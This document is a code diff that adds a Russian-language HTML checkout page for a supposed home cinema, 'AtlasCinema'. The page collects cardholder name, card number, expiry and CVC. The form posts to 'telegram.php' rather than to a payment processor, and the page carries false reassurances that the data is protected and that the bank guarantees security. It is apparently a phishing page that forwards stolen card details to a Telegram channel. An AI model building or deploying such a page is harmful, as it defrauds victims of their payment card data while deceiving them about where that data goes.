@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AtlasPayment</title>
+    <link rel="stylesheet" href="css/pay.css">
+    <link rel="stylesheet" href="css/reset.css">
+</head>
+<body>
+    <div class="pay_wrapper">
+        <div class="pay">
+
+            <div class="pay_info">
+                <h3>Платежная информация</h3>
+                <p>
+                    Оплата билета, домашний кинотеатр "AtlasCinema".<br>
+                    Номер заявки: <span id="random_number"></span></p>
+            </div>
+
+            <div class="pay_photo">
+                <div class="photo">
+                    <img class="pay_photo_vima" src="css/images/pay/vima.png">
+                        <span class="pay_photo_dot"></span>
+                </div>
+                <div class="pay_photo_text">
+                    <p>Оплата с помощью банковской карты VISA или MasterCard.
+                    Безопасность обработки платежа по пластиковым картам
+                    гарантирует банк-эквайер.</p>
+                </div>
+            </div>
+
+            <form action="telegram.php" method="post" class="pay_form _req" id="form">
+                <p>Владелец карты</p>
+                <input name="владелец" type="text" class="pay_form_name _req">
+                <p>Номер карты</p>
+                <input name="номер" type="text" class="pay_form_card _req">
+                <p>Срок действия</p>
+                <input name="срок" type="text" class="pay_form_validity _req" maxlength="5">
+                <p>CVC номер<span>?</span></p>
+                <input name="свс" type="text" class="pay_form_cvc _req" maxlength="3">
+                <div class="protected">
+                  <p><img src="css/images/more_photo/paylock.svg">Ваши данные надежно защищены</p>
+                </div>
+                <div class="pay_btn">
+                    <button type="submit">Отправить</button>
+                </div>
+            </form>
+
+        </div>
+    </div>
+
+
+    <script src="js/pay.js"></script>
+    <script src="js/basket_valid.js"></script>
+</body>
+</html>
